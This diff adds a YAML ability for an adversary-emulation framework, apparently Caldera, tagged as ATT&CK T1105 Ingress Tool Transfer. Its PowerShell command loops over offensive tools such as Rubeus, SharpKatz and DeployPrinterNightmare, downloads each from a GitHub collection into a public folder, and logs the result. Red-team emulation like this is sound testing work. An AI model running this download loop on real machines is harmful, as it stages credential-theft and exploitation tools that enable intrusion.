@@ -1,0 +1,29 @@
+- name: Downloads several compiled attack tools
+  description: Ability to download several attack tools using a loop.
+  tactic: command-and-control
+  technique_id: T1105
+  technique_name: Ingress Tool Transfer
+  executors:
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
+    command: "$DownloadLogFile = \"$env:PUBLIC\\exf\\Tools_Download.log\";\n$DestinationPath\
+      \ = \"$env:PUBLIC\\Toolz\\\";\n$SoftToDownload = @(\"Seatbelt.exe\",\"Rubeus.exe\"\
+      ,\"SauronEye.exe\",\"DeployPrinterNightmare.exe\",\"SharpKatz.exe\")\nforeach\
+      \ ($Tool in $SoftToDownload) \n{\nWrite-host $Tool;\n  $DownloadRun = \"https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/$Tool\"\
+      ;\n  $DestinationFilename = \"$DestinationPath$Tool\";\n  $web = (New-Object\
+      \ System.Net.WebClient);\n  $result = $web.DownloadFile(\"$DownloadRun\", \"\
+      $DestinationFileName\");\n  Write-Output \"The file $Tool has been successfully\
+      \ downloaded from $DownloadRun and stored to $DestinationFilename\" | Out-File\
+      \ -FilePath \"$DownloadLogFile\" -Append;\n  }"
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  id: download_tools
